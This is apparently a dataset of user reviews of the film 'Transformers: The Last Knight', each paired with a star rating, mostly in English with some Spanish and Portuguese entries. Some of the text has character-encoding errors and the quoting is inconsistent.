"The main issue with this film is: It is stuffed with the plots of other films, and with no sense of direction. Bay seemed to write this film scene by scene and changed the style accordingly. For a film that turns the characters on each other (fast and furious 8...?) Pitifully rims the da vinci code, has a ""bad guys used by the government"" character selection scene (suicide squad) etc... - It feels packed of unoriginality. What's worse is that this film doesn't feel like a transformers film anymore. The charm of a young man and his car which happens to turn into a robot, died at about the same time shia went insane. Stuffed with jargon and stupid jokes - it vomits exposition and expects you to keep up - let alone the fact I'm not even sure at this point if the plot fits in with the rest of the franchise. Yes I was entertained, but from a moviemaking point of view, It's very disappointing. I shiver to think how awesome this franchise could be after being rebooted under a much less pathetic director.",1

"A film that barely clears the incredibly low bar set by its predecessor. It was amazing how quickly I simply didn't care within the first few minutes.

"Transformers: The Last Knight is the fifth movie in Bay's Transformers series and is the worst one yet. Michael Bay somehow got away with making five same movies in the course of 10 years. Even the longest horror franchises haven't had such similar sequels! Nightmare on Elm Street and Halloween both had something new in each of their sequels and it never felt like I was watching the same movie. With Transformers I keep having the feeling like I've seen this before. There's always some object that the Decepticons want that's capable of destroying the world and a few Autobots and some annoying, uninteresting human characters help those few Autobots out. In the end we get an Optimus Prime monologue where he says ""I'm Optimus Prime"" and continues to talk about honor, loyalty and whatnot. During the monologue, the camera swirls around and we get epic wide shots of the sunset and silhouettes of our characters as the movie's theme song starts to play. It's easily the laziest filmmaking I've seen ever. I understand the phrase ""If it's not broken, don't fix it"", but Transformers movies have been broken for 10 years now. The first movie was the only decent one as it was the first time we got a live-action Transformers movie and the story was presented to us for the first time. Then came 4 sequels that were basically the same movie as the first one and I'm not getting fooled anymore. I'm sick of Michael Bay doing this. There's a fantastic Nostalgia Critic video on YouTube where he explains the entire movie without having seen it. He predicts what's going to happen based on how the other 4 movies were and guess what? He's about 80-90% correct! Thankfully, The Last Knight is said to be the last Bay Transformers movie and I hope that's true. I really hope he doesn't get to make another one of these abominations. Anyways, that's my rant on how same every TF movie is. Now let's get into The Last Knight! The story follows Mark Wahlberg's character from Age of Extinction, Cade Yeager, who's now working with the Autobots and helping them live on Earth. He's also got a new comic relief character, since T.J. Miller's character died in the last movie, who doesn't do anything important in the movie at all and I honestly can't remember his name. The movie starts off with a medieval battle and we're introduced to this movie's version of Merlin, played by Stanley Tucci. In a completely ridiculous scene, a transformer hands over his ""magical staff"" to Merlin which he uses to summon and control a transformer dragon to aid his fellow men in battle. If that's not crazy enough for you, the Knights of the round table also have their transformers version. That's right. This movie is absolutely confusing. To top it off, Optimus Prime is now being controlled by a female transformer thing called Quintessa who wants to destroy the world and save Cybertron. In order to do so, Prime must find Merlin's staff (the one from the medieval ""flashback""). We haven't even gotten to the most insane part of the movie. Mark Wahlberg is the last knight from the title of the movie and has this transformer talisman with him constantly that moves around his body and finally comes into play at the very end of the movie when he conjures up the Excalibur and uses it to fight off Decepticon knights. Furthermore, we also get the typical ""I'm wearing glasses so think of me as a smart person, but I'm incredibly hot, too, so please stare at my body in this tight dress while Bay moves the camera around me so you can get a good, long look at me"" character called Vivian. Vivian is related to Merlin and is the only person who can actually pick up and use his staff that Optimus needs to save Cybertron. Let that sink in. Even with all that ridiculous crap that makes zero sense, Bay managed to make the movie even more jaw-droppingly bad by changing the aspect ratio of the picture every few seconds. We go from 1.90:1 to 2.00:1 to 2.39:1. It's completely messed up and I don't know why Bay felt the need to shoot some scenes with one camera and other scenes with other cameras. The result is atrocious and I hope to never see another movie like this again. The editing in the action sequences is quite bad, as well. It's another case of ""shaky-cam"". Bay uses this a lot in his movies. Whenever an action scene is going down, he shakes the camera a lot which makes for a very nauseous feeling and you can't tell who's fighting who on the screen. I've also noticed in some cases that the cuts are also misplaced. For example, there's a scene where Vivian and Yeager are walking in an alien ship underground where Merlin's tomb is (I don't know, it's like they made it up as they were filming) and Vivian is walking in one shot and then it cuts, and she's crouching on the ground and examining it. It occurs a few times during the movie and proves how sloppy the editing is. The ending is the same as any other movie in the franchise, I don't even need to comment on it. The only thing I liked in the movie was the Nemesis Prime and Bumblebee fight scene where Bumblebee gets his original voice back and we hear him actually talk for the first time ever. Unfortunately, evil Optimus Prime doesn't last long and the battle is cut short. Speaking of Optimus Prime, he's in the movie for about 5-10 minutes and his scenes feel like they're only there to serve as fanservice. Product placement is another one of Bay's trademarks and this movie is no exception! Yeager even has his own dinosaur transformer that brings him Bud Light! Oh yeah, Anthony Hopkins is also in this movie. Can't believe it myself, but it's true! He plays this all-knowing history buff that explains the entire history of Arthur and Merlin and transformers in a 10-20 minute sequence. He's the exposition character. Almost forgot, at the beginning of the movie we follow a couple of kids walking through a destroyed city and they find a crashed alien ship with a transformer in it. Some little girl, Izabella, comes and saves the kids from the army with her transformer helper, who also dies in a very emotional and tearjerking scene where she talks about how he's his only family. Her character doesn't do much for the story except to make the movie appeal more to that demographic. The CGI is quite decent, though you can tell everything is fake just by looking at it. Sure it looks nice, but I know what I'm seeing is not real and the script doesn't develop any of the transformers so they don't even have emotional weight with them to make us care for them. They're just there to fight and be a spectacle for many kids watching this and thinking it's the best movie ever. The ending's battle sequence in the air is easily the best looking scene in the movie, but that doesn't say much. The acting wasn't that good. The delivery of the dialogue felt very awkward and wooden at times and I don't know why half of these people agreed to star in this movie. No, wait, I know! Money! This movie is made for money only. It's not made because the director and the writers wanted to make it. It's made because it's going to earn a lot of money, especially outside of the US. So far, the movie grossed over 600 million dollars and I can't believe it, personally. That people would pay to see the same movie again for the fifth time makes me want to weep. All in all, Transformers: The Last Knight is a disgrace to the art of filmmaking and serves as a final nail in the coffin which holds the Transformers franchise. I would never recommend watching any of the Transformers movies. We must not support these kind of movies. This is garbage that shouldn't have ever seen the day of light and I hope we never get another movie in this franchise.",1.5
"This movie had everything. Heart touching moments, happy, sad, mad, and bad moments, all mixed in with ACTION. Thriller type ACTION, on the edge of your seat ACTION. And with a cast like it has, Mark Wahlburg, Anthony Hopkins, Josh Duhamel, John Further I, and countless other greats, who could complain?!?! I'm looking forward (praying actually) to Transformers 6! Who knows, it could be called ""The Prime Years"". Jus sayin",4
"Ok guys, how many times are we gonna do this shit? I mean, at this point you can't go into a Transformers movie without expecting one thing; pure, and utter shit. We are past the point of subtlety here, there is no hoping for anything more than shit because Michael Bay and Paramount have clearly found a formula that makes money and they are going to stick with it. Which begs the question...... why bother hiring a writers room full of experienced writers when everyone is going to just back up Bay's direction because it is the one that has proven to work. Anyway, this movie stars Mark Wahlberg as Cade Yeager as he leads the fight between the humans, Autobots, and Decepticons once again to save the earth from a new big evil threat..... blah blah you know the routine. The plot is weak and poorly executed, humour falls flat on every occasion, and none of the characters are even slightly interesting. If it wasn't for the special effects this movie would have nothing going for it because even the action at this point in the franchise feels tired. The plot of this film is remarkable, it is remarkable because of how it can be so busy and packed with stuff but also so full of nothing at the same time. We have a story that rewrites the history of the Transformers on Earth, stretching back to the dark ages in order to introduce the presence and importance of a new mcguffin, no wait, TWO new mcguffins, that are barely explained that see multiple characters and organisations clashing heads in order to obtain them. It tries so hard, so damn hard to give some sort of higher meaning behind what this movie is really about, an external force trying to destroy the earth...... simple as that. It goes through so many farfetched and boring loop holes of exposition to make certain characters all of a sudden crucially important to the story to the point where i don't even know the significance of 'The Last Knight' in the plot. This exploration of the past could have been interesting, the presence of the Transformers alongside King Arthur and the knights of the round table, and during Nazi Germany in WWII made for two of the more narratively interesting sequences of the film. But this accounts for maybe 5% of the movie's total runtime. Anthony Hopkins in this this abomination as Mr Exposition... sorry i meant to say Sir Edmund Burton, his character's sole purpose within this entire film is to talk and explain, talk and explain. He provides exposition after exposition that will put you to sleep with absolute fucking ease. This was a complete waste of talent where i believe Bay hired him so that he can shove him in the trailer and give people the impression that this will be a serious film. As for the rest of the human cast, who gives a flying shit about their characters? I don't think it's their fault, i mean, none of the humans are given an arc worth caring about. Mark Wahlberg is just Mark Wahlberg doing the same crap, being the hero running through explosions and dodging bullets like a fucking ninja. Laura Haddock is the essential 'hot chick' this time around because what is a Transformers movie without a love interest whose purpose is to just be a bit of eye candy for two hours. They actually try to tie the character into the plot this time giving an excuse for why she is there but it's so lazily explained i just chose to ignore it. And i don't know if Bay thought bringing Josh Duhamel and John Turturro back into the series would get people to care more because it definitely did nothing for my enjoyment of the movie. Isabella Moner plays the young Izabella in the film and i have to admit, she wasn't bad. The character was just as boring as the rest of them but i feel like she put in effort to try bring more to the film but made no real difference. There is no doubting the fact that once again the special effects are brilliant, seeing the transformers interacting with the real objects within the world and fighting in large scale battles is still very impressive so i can't fault the film there. There are some brief action sequences that visually look quite cool but they fail to bring any excitement to the film because we are 5 films in and we have seen more or less everything this franchise has to offer. So although the action is there it's just more visual noise, and unfortunately visual noise just isn't going to cut it, even in a Transformers movie. The film is humourless and despite being the 2nd shortest in the franchise (behind the first film) it is still way too fucking long and drawn out. As a result the pacing is all over the place as action sequences and downtime are poorly balanced leaving long stretches of boring mess. The longest stretch of boring mess lasted a total of 2 hours and 29 minutes. So in the end, this franchise is so far down the shitter that there is no clear avenue for redemption, especially while the franchise stays under the watchful eye of Michel Bay. And yes, i know this is the final film in the franchise that Michael Bay is directing but he will be producing the future films and still having his input on their creation. Even if he wasn't directly involved he has still carved a formula for these films that is financially beneficial for Paramount so they have barely a reason to shake things up. You already know if you will enjoy this movie or not so you don't need me to tell you it's shit. Until next time Transformers, stay shitty. 1.6/10",1
"This movie is so bad, it's an assault on cinema. It's a poorly made mess by a man who knows that as long as he blows something up every 30 seconds that you will get people to applaud like monkeys at your objectively awful movie with no redeeming qualities. This movie made me think of a line from a movie that I honestly love and it applies here so perfectly: Kill everyone now! Condone first degree murder! Advocate cannibalism! Eat shit! That line right there? That is a better more fulfilling piece of dialogue than anything you will find in Transformers. AVOID AT ALL COSTS!",0.5

Loved it from start to finish! So epic and funny and fast paced! 10/10,5
amazing film! can't wait for the next one it's going to be fantastic,5
This movie was trash. It was so boring. Optimus prime is evil for like 2 minutes. Mark wahlberg gets a robot ringworm for some reason and a sword for like one scene. Apparently the decepticons keep finding the dragon balls and wishing Megatron back to life. This movie says it itself that it is unnecessary,1
"i saw this movie in the cinema. i paid money to see it. after seeing it i came to the conclusion that, firstly, i hate this film, second i hate this film and finally i hate this film. FOR THE LOVE OF GOD WE DO NOT NEED ANY MORE OF THIS AWFUL AWFUL FILMS!!!",0.5

"Mira que me gustan los Transformes, los originales, los que ve√≠a y le√≠a y con los que jugaba cuando era peque√±o, y los que colecciono ahora de mayor. Mira que quiero que me gusten estas pel√≠culas, con su acci√≥n exagerada, sus explosiones, y todo eso marca Michael Bay. El mayor problema que tiene esta pel√≠cula no es su gui√≥n nada del otro jueves, son los propios transformers. Cada vez est√°n m√°s personificados, parecen m√°s alien√≠genas grandes que robots transformables. De hecho, apenas hay siquiera transformaciones en toda la pel√≠cula. Michael Bay parece que ha entendido bien lo que le da dinero, pero no de qu√© van los Transformers.",2
As dumb as they come.,1
"Thinly plotted, uninteresting main characters, annoying one liners, so much narration and exposition, and the CGI is not even good, this is exactly what a critic would expect from a 5th transformers movie (especially one that has the same plot as the 3rd movie).

"Two species which are not at war anymore: film critics and audience The ""Transformers"" saga has come from more to less. Starting exactly a decade ago, Paramount Pictures broke into Hasbro toys, adapting them into audiovisual products, those metallic giants found on planet earth a provisional protection. Shia LaBeouf's rebellious young role, the eye candy who Megan Fox turned out to be, Michael Bay extravagances idealizing sequences as hilarious as showy and the narrative delusions implanted in a script that is out of touch, all the above imparted the rules by which the following movies would be ruled, without the possibility of an iota of irregularity. Squeaky heroic acts, sensual women appropriating of sexual roles, virile and muscular leading principal actors, incomprehensible twists and a direct ticket for a legendary actor with frame of mind spirit to demand his high-priced stipend and send his prodigious acting career to hell. It has become evident that complaints about this franchise don't cease, however, the film studio doesn't step down by seeing the answer, ironically, positive at the box office, causing a disagreement of opinions between audience and reviewers. Nevertheless, the movie with the power to converge these two opposite poles in an exact point of embarrassing dejection, describing the most recent installment of Autobots and Decepticons with adjectives as very long, cacophonous, intelligible and sleep-inducing. Navigating more than seven scenarios, the story follows the customary leading role Cade Yeager, accompanied by unusual characters as, nothing more or nothing less, Merlin and the Knights of the Round Table, who are starting point for development of the plot; Vivian Wembley (Laura Haddock), the only living descendant who can take up his sword; Lennox (Josh Duhamel), military captain who hinders goals of our heroes, Izabella (Isabela Moner), a girl who cures Autobots introduced to possibly inherit the unlikely franchise or the amount of coming spin-offs; Sir Edmund Burton (Anthony Hopkins), faithful sentinel of the genesis of Transformers; and the ideological troubles of two races that are at war in the same world, some humans and other metallics. Openly, the salvable compounds in this sea of nooks are limited, unnecessarily, convoluted and lacking any vestige of attraction, generated by a quartet of writers with highly utopian ambitions, which strive in opposition to a narrative barrier in which no longer keep the same expectations. Such information that slides through Nazi, alien, Mexican, Cuban, European, North American and even medieval settings causes, either from water, air or earth, the feature film feels exaggeratedly longer than the previous outstretched films. Action intervals are inscribed into the plot with decisive rigidity and aren't sufficiently suggestive to pretext the mechanical yawns turning up from the middle of the runtime and is rapidly intensified over longer final climax. As for dialogue, written at six hands by Art Marcum, Matt Holloway and Ken Nolan; It underlines coarse update surrounding the criticized racist misogynist manias of the franchise, which are enhanced by equipping the eye candy with Oxford university titles and doctorates, intellectual glasses and a heady black dress that makes evident that, in fact, nothing has changed. The legendary actor on duty is our Dr. Hannibal Lecter from ""The Silence of the Lambs"", who paraphrases understandable synthetic scenes or performs a well-bred London informative safeguard, no doubt, the most remarkable character among all others, of course, those of flesh and bone. It's enviable the support that Paramount Pictures offers Michael Bay to quench his idealized film dementias, some grandiloquently materialistic and other exaggeratedly pretentious. I said enviable because, personally, I feel a strong connection with this directional kind, also evidenced by Jordan Vogt-Roberts in the recent ""Kong: Skull Island"", of course, referring explicitly to the visual aspect. Propagating with a striking commercial paraphernalia, the fifth installment in the saga is the first to be filmed, entirely, on IMAX 3D cameras, state-of-the-art devices that give majestic images, boasting technical capabilities that embroider the spectacular. Without a doubt, the talent of this director lies in cinematography, the knowledge to fit precise pieces that, here, are harmed by the arrhythmic editing work, emphasizing the variations of aspect ratios that the sequences ache, an unintentional distractor. Fleeting bursts, frantic chases, metal hits, shiny frames and whimsical landscapes file throughout the film, a summer cinema show lacking a good edition work and excitement. Announced in advance, the retirement of Bay and Wahlberg from ""Transformers"" franchise gives an air of hope and faith to restructure the unlikely future installments, since, what has been achieved with ""the Last Knight"", puts the plans of the studio at risk, seeing the unfavourable reception of both critics and audience. However, it cannot be categorized as an absolute film disaster because, although it contains flaws equivalent to the budget in editing, soundtrack and script fields; what the director and his artistic crew do with the scenes deserves enough merit to overlap the yawns and naps attempts in theatres. Yes, this is the only reason to see the movie, you've been warned, experience it in IMAX cinemas, with the largest screen and the most suitable position. Sit down, buckle up and try to enjoy this resounding candy conceived by Bay.",3
Great movie. Great stunts and interesting storyline!!! Loved seeing all the Autobots in actions!!!,4.5
"Summary: do not see not worth the money at all and need to stop.

"In my views, it should have been better than the Mummy.",3
"SCOTT: (Dr. Scott Allison, Professor of Psychology, University of Richmond) Greg, it seems like these Transformers never change. GREG: (Greg Smith, Founder of Agile Writers of Richmond, VA) It turns out they really are not more than meets the eye. Let s recap: SCOTT: In the 5th century, Merlin has teamed up with a dozen transformers in England to defeat the Saxons. In the present day, most of earth has outlawed transformers but they appear to be everywhere and they keep arriving. Cade Yeager (Mark Wahlberg) has devoted his life to protecting the transformers, and he befriends a 14-year-old girl named Izabella (Isabela Moner). Meanwhile, on the planet Cybertron, Optimus Prime (Peter Cullen) has been captured by the evil Quintessa (Gemma Chan). GREG: Over in England, Sir Edmund Burton (Anthony Hopkins) has summoned Cade because he s been chosen by an ancient Transformer to the the last knight. Cade meets the beautiful and educated Vivian Wembley (Laura Haddock). She knows the location of Merlin s staff that can repel Cybertron. Now it s a race against time as Cade and Vivian try to escape the Army, the TRF, ancient Transformers, and the Decepticons to defeat Quintessa and evil Optimus Prime and save Earth. SCOTT: Greg, these Transformers movies are exhausting. No wonder this movie clocks in at two and a half hours its tries to pack in every character and every plot device from every action movie ever made. We have a confusing array of heroes. First, there is a young girl in the ruins. Then there is Mark Wahlbergs character Cade Yeager. Then Anthony Hopkins shows up. Then a beautiful professor of history joins in. There are also many villains: A floating metal woman named Quintessa, the TRF police hunting the transformers, plus a criminal gang of robot freaks led by Megatron. It s as if this movie wants to be an amalgam of Men in Black, National Treasure, and even Star Wars (as there are two robots resembling R2D2 and C3PO). This film has the same basic problem that plagues previous installments of Transformers, namely, it doesn t know what it wants to be or who in the audience it should appeal to. The movie is too juvenile to appeal to adults and too crude to be appropriate for kids. Maybe that s why it throws in everything plus the kitchen sink. If you include enough of everything, maybe something will stick to someone. GREG: I could not agree more. What I saw was drones that looked like Tie-Fighters and robot destructors that looked like At-At s. And plot twists that came out of The DiVinci Code. As if that weren t enough, this was more like two separate movies. The first half resembles the plot of Logan with Izabella the Hispanic girl chasing our hero. She s tough and resilient - just like Laura from the aforementioned movie. Then the movie abandons this storyline in favor of a sort of a DaVinci Code plot with the vivacious Vivian where they must decode the mysteries of historical artifacts. It is as if the writers could not agree on a plot so they combined two. It was a colossal mess. SCOTT: I don t think this film is a total disaster, as it does try to hit some key elements of the hero s journey and heroism in general. Optimus Prime redeems himself and transforms back into his old benevolent self when an old friend expresses a willingness to die for him. This scene actually moved me. But I also know that the filmmakers threw in a few ingredients of heroism as an afterthought, just to make sure they covered a few key bases in the most perfunctory way. For example, at the film s end there is a brief speech about how our heroes just want to find home and how so much of our inner discoveries remain mysteries. Cade Yeager even has a secret identity as a knight, which is a classic theme in hero mythology. That s all well and good but this film is guilty of superficially exploring these heroic themes. Sadly, Transformers movies are first and foremost hyper-masculine films consisting mostly of violence, cleavage, and dickhead comments. GREG: Yeah. There are a lot of tossed-in elements. It s like some sort of movie salad. Borrowed elements from other movies. Borrowed archetypes. Borrowed characters. The most heroic character (and by far the most interesting) was Izabella. She s wise beyond her years, tough, and capable. Cade tries to treat her like a naive child and she has none of it. Likewise, Vivian is a lot smarter than Cade and when the chips are down, it is she who can wield Merlin s staff and save the day. Which is very confusing because it makes us wonder what Cade is there for. The artifact that chose him to be the one true knight. The artifact turns into Excalibur and then in a flash disappears. The most interesting characters in this film are the two women and there isn t a single scene with the two of them together. SCOTT: I think your movie salad description really says it all, Greg. Transformers: The Last Knight is an oversized casserole that you can t possibly finish, nor would you want to. There s just too much sound and fury with too little substance. There s quite possibly a good movie lurking somewhere in this sloppy stew, but it s hopelessly obscured by a cacophony of sights and sounds, most of them unnecessary. I m generously awarding this film 2 Reels out of 5. We do have several worthy heroes. Izabella is a good character who deserves more character development. Shes an example of heroic potential wasted. Cade Yeager is also an admirable hero who grows into his knightly role, but he s also a flimsy character due to this film s emphasis on action, CGI effects, flash, and noise. Burton and Wembley also have potential but are lost in the blaring cacophony. Heroic themes of home and inner discovery are buried as well. Thus all I can muster is a hero rating of 2 out of 5. You d think a Transformers movie would be bursting with interesting transformations, but alas, the vast majority of transformations here are of the physical variety. Machines become monsters and monsters become vehicles, etc. Optimus Prime does undergo a moving transformation from hero to villain and then back to hero again. But it s all done on an unsatisfying surface level. As a result, I can only must a rating of 2 transformation Deltas out of 5. Movie: Transformations: Heroes: GREG: Scott, you are far too generous to this film. Transformers: The Last Knight is a mashup of a dozen other films. There s nothing original here. And it was bloated to over 2 hours and 30 minutes. Yet in all this mess there was a barely perceptible plot. The goal was to save the Earth - but that isn t established well into the second act. It took a long time to know what this film was about. I can only give it 1 Reel out of 5. There were a bunch of heroes in this film that we haven t really talked about. There were many Autobot Transformers to play sidekicks. And the Decepticons were there for a minute. There s a big scene where Megatron picks his Suicide Squad - and then they never appear in the film. These heroes are weak and uninteresting. Aside from the two women, I don t have any use for them. I give this film 1 out of 5 Heroes. And despite the many transformations from robot to automobile back to robot - there really isn t much growth or transformation for these characters. I give them all just 1 Delta out of 5. Movie: Transformations: Heroes:",1.5

A perfect example of a decay pop culture that caters to the lowest form of humor. A cluster bomb of ridiculous plot lines held together with stereotypical movies tropes that leave that is insulting to the audience temperament. One of the highlights of fog of the movie is the opening scene which honest to God I thought I was a different movie and walked into a different theater.",0.5

"Where's Optimus....that was a line in the movie bc the soldiers didn't know where he went... neither did I! He just disappeared for a scene. Flow of the movie was choppy so you get confused often. When it finished I said ""that was terrible"". Not pleased with this movie at all.",1
I loved watching this movie with my son. It was fun and had a cohesive plot line. Thank you Michael Bay for bringing my childhood Sunday cartoons to life. With the added bonus of the good memories I'll share with my kid watching it.,4.5

"Mala. After the frustrating saga that began exactly a decade ago, they have tried to charge the character, to modernize some things, like the robots, and to invent a plot too tense, but too boring, with an absurd beginning, but of interesting , Left over elements nuisance and lacking a little adrenaline, that is, of action, as new threats, new attacks, blows, sieges, normal we go. Anyway, and not to extend my frustration releasing something I did not have to have said, it is interesting, if you want to kill time, but not so reliable to the line of argument of the saga.

The language and overtones of this movie were just over the top and unnecessary. On to point two. Was this the first script for this writers? It made no sense! Dialogue was forced and added nothing to the story. Terrible. Point 3. What was the point of introducing new, pointless characters? Why bring back some characters for tiny roles? Why did we need so many characters to follow? And WHY...WHY... in a TRANSFORMERS MOVIE, do you focus on the humans? Optimus and Megatron? Meh, let's just leave those guys to about 10 minutes of screen time. Who edited this? I thought the theater was having issues, with all the odd jumping around. Nope, the entire movie just jumped around pointlessly from extraneous scene to another extraneous scene. Come on, folks... go find a copy of the first movie and get back to what works, or your next film will be a guaranteed direct-to-VHS flop. ;-)",1
Did not like the story telling part in the beginning but it helped to make sense of the story. Some funny parts. A lot of action which I liked. There is a scene at the end that left it open for another transformers movie.,4

"I feel like I saw a completely different movie than the one reviewed by everyone here. Not often I disagree so completely with RT reviews. I have seen every Trransformers movie many times and actually after the 1st, this is my favorite. I believe it has the most adult aspect - sorry but the Widwicki thing was getting very old as was that cast. I really think this is one of Wahlberg's best performances, and apparently unlike most thought Hopkins also did an excellent job and really kind of liked the raunchier side of him I hadn't seen until this flick, The special effects were in fact pretty darn mind-blowing and I'm pretty appalled with the clear massive effort that had to go into them that the critics did not give them a lot more props. They were neck in neck up there with the likes of Avengers and Civil War. Isabella was cast perfectly in this movie. So much so, that I put her in this role neck in neck against Shia in the original as far as a natural fit in the role. Hopefully she will continue in future entries in the series. At the top of the list of important elements in any Transformer flick of course is the one or more massive ""second coming"" hero-moments. You know it as well as I do - we all wait for it. Well, of all the installments to date, The Last Knight has BY FAR the most. No spoilers here (I hate them) but I counted at least FOUR of those that make you want to rise out of your chair and scream approval back at the movie as if at a sporting event. Overall, I have re-watched all the installments at least a couple times, and my guess is that once released at home that Last Knight will certainly be no different, and will most likely quickly rack up a higher repeat count in my household than it's predecessors.",3.5

"This film is not fantastic, I'll say that now. Like the other films minus AOE it does not give characters enough screen time to actually get to know them, and the pacing overall is haphazard at best. However, the robot fights are the bread and butter of the movie franchise and for what this film delivers, I enjoyed it. Michael Bay's last Transformers film may have missed the mark, but it was still a decent film. Just don't expect to be wowed.",4
We have had enough. No more please. I'm Sorry but the Only way I will watch another one of these in the theatre is if you bring back Megan fox and make this a porno. Thank you,0.5
"The best thing to come out of this film is Michael Bay's development of new IMAX 3D cameras that better directors will eventually be able to get their hands on. That earns it 1 star. What an incoherent orgy of moments ripped off from his series and other films from the last few years. I have no idea how someone makes 5 films and just gets worse every single time. With terrible shot choices and a God-awful plot - ""The Last Knight"" is the pure definition of a crap film from a terrible franchise with no apparent end in sight. There's just too much wrong with this film - making Saban's Power Rangers (2017) look like an academy award winning effort. Michel Bay has finally proven that you can go too far. What a colossal waste of money. And looking back the 1st film isn't even bad - actually a lot of fun. And somehow everything hits the fan in that Fast 5, BvS, Suicide Squad, & Transformers knock off.",0.5
"Transformers: The Last Knight could easily be the worst movie of the summer, maybe even, the worst film of the year. Michael Bay's fifth installment into the Transformers franchise is absolutely awful. From the plot, to the CGI, dialogue, to the humor and back, this film is atrocious top to bottom, beginning to end. To make matters worse, the film just keeps going and going for a dreadful two and a half hours. Transformers 5 starts off during the dark ages, in a battle where wizard Merlin (Stanley Tucci) was given a magical staff by the robot aliens. The premise then proceeds to Decepticon lord, Megatron (Frank Welker) assembling a team to find the magic staff before the autobots. The plan is to retrieve the weapon for Quintessa (Gemma Chan), creator of the alien robots, for her use in restoring Cybertron. Along the way, Optimus (Peter Cullen) goes rogue, Yeager (Mark Wahlberg) is on the run, and a new government agency is fighting all alien threats. The storyline is all too familiar, since it's the exact same premise as the rest of the series. The film is confusing and hard to follow. It rewrites history to include alien robots on earth for centuries, even mentions they killed Hitler (yes, that's really in the film). In addition to the storyline being no different than the rest of the series, it's choppy and all over the place. They start off in the dark ages, cut to the quarantined area of Chicago, then they are in the UK, then in a submarine, it's difficult to pay attention after ten minutes. They didn't develop characters, for example, Quintessa, didn't do anything! Wasn't in the film long enough to develop villandry. Nemesis Prime suffers a similar fate as he gets minimal screen time. The CGI/special effects on this movie is sloppy. A perfect example of doing your homework Monday morning on your 15 minute bus ride to school. Absolutely terrible, careless and clumsy. The worst of the modern era. By the same token, the film slows down every other scene for no apparent reason. Finally, the dialogue and the humor makes you want to blow your brains out. Super cheesy and trying way too hard to appeal to this millennial crap. In other words, overuse of the word, ""bro"" and stupid one liners. The humor was childish and just plain sad to the point the film attempted a BBW joke (at that point, seriously considered leaving the movie theatre). The acting was equally as bad, with some exception. Familiar faces such as Mark Wahlberg and Anthony Hopkins brought their usual great stuff (and are jumping ship after this film). The rest of the crew......yeah, not much to say. Besides those two, the Megatron design for Transformers 5 was exceptional. Megatron looked good, strong and was a true villain. There is a scene where he's in a cave sitting on scrap metal and is addressed as ""lord"". Great scene, really resembled an evil lord like Vader, Voldemort or Sauron. Also, the scene when he negotiates with the humans. Arguably, the best scenes of this train wreck. Overall, skip this film. It's confusing, hard to follow, cheesy and outright stupid. More importantly than saving your money, save your time! Transformers: The Last Knight is god awful, zero out of five, worst movie of the summer. It could be worst movie of the year. Transformers: The Last Knight should be Transformers: The Last Installment.",0.5
"I was expecting a dumb fun movie, but all I get is a bland action that has been done to death since the first movie came out. The only reason I don't feel angry is because I was expecting to be bad since the last film. I just say watch the film on netflex when it come out",2
"Good movie , good scenario, so I enjoyed the movie a lot.",4.5
"The movie follows a formula that doesn't work anymore. It jumps from action to action, giving no time to digest the scenes, and it stupidly combines action scenes with humor destroying all tension, leaving the public exhausted before the movie's ending.",1
"Ok first of all enough of this toy advert nonsense, I know it's the trendy ""intelligent"" thing to spout off but think about it, the film makes megabucks at the box office, do you seriously think they care about selling toys that much. Even if the original concept was thought up by a toy company it's still a fantastic idea which captured the imaginations of millions of children and it's complete snobbery to discount it on this basis, do you think Stan Lee did what he did for the good of the human race, no he did it to sell comics (and toys). Out of the five films this was my favourite by far, loved the first one, thought the next three were ok but this one is truly amazing. I can appreciate there is a lot to take in and it's very fast paced but that only made me want to go and see it again to register everything. The special effects are mind blowing, the level of detail is truly incredible and the 3d is the best I've seen by miles. The acting is of a high standard, I particularly enjoyed the repartee between John Turturro and Anthony Hopkins and also Hopkins and Cogman (oh and people saying he was a C3po rip off are kind of ignoring the fact that it's alluded to in a tongue in cheek way and seriously if you think Star Wars was the first thing to feature a subservient human shaped robot then you need to educate yourselves). Granted there are some very cheesy lines and some pointless ones (at one point Lennox says ""it's a huge alien ship"" when we already know that and it's blatantly obvious, a shot of him and the sub crew looking aghast would have done) and I don't understand how Bumblebee gets to England with Cade but those are only very minor issues. There are some genuinely funny parts and some great rousing speeches by Optimus (yes he does say ""I am Optimus Prime"" a lot but he is Optimus Prime and anyone well versed in Transformers will know that that's what he generally does). It's not Magnolia or Lost In Translation (which to be honest I found ridiculously over rated but I guess were cool to say you liked) but it's not supposed to be, it's a film about giant alien robots fighting each other, I adore this film (surprisingly more than Star Wars and that runs through my dna).",5
Very good movie but some very different movie but still a very good one.,5
"You know there's something wrong with the film when you're yawning during the action sequences. To be fair, there are some neat ideas in here but they're executed so poorly that instead of being crazy fun, they come across as dull and generic. Outside of visuals, the other redeeming quality of this film is Isabela Moner's film-stealing performance. Also, did you ever imagine that Oscar-winning Sir Anthony Hopkins would ever utter the word ""dude""?",1.5
Three stars because its a bit more than I expected from a Michael Bay movie.,3
"Transformers last knight was one of the worst transformers film in its franchise. The story-telling was quite boring, the performance was pretty dull, the humor is your typical Michael bay humor. The action was pretty mindless, but tolerable. The only thing was interesting was the cgi, but it is not saying much! Don't waste your time on this typical Michael Bay film!",2
This will amaze you OK just watch it don't listen to the critics,5
Whoever hated it watch it again you will enjoy it,5

"Cont√©m Spoilers DEMITAM MICHAEL BAY PELO AMOR DE DEUS! O roteiro do filme √© p√©ssimo. Sou f√£ de Transformers desde pequeno e este Transformers: O √öltimo Cavaleiro ser√° o maior fracasso do ano.

O lema do filme √© ""sem sacrif√≠cio n√£o h√° vit√≥ria"", realmente a sala de roteiristas e Michael Bay n√£o se sacrificou em nada para pensar em um roteiro decente, por isso o fracasso. O filme √© um barulho ensurdecedor do inicio ao fim, nem m√∫sica que √© o ponto forte do primeiro tem direito. Tem pl√°gio de Game Of Trones com o drag√£o, c√≥pia de peda√ßos de outros filmes dos Transformers, copias de ideias de filmes anteriores como a cenas dos avi√µes.

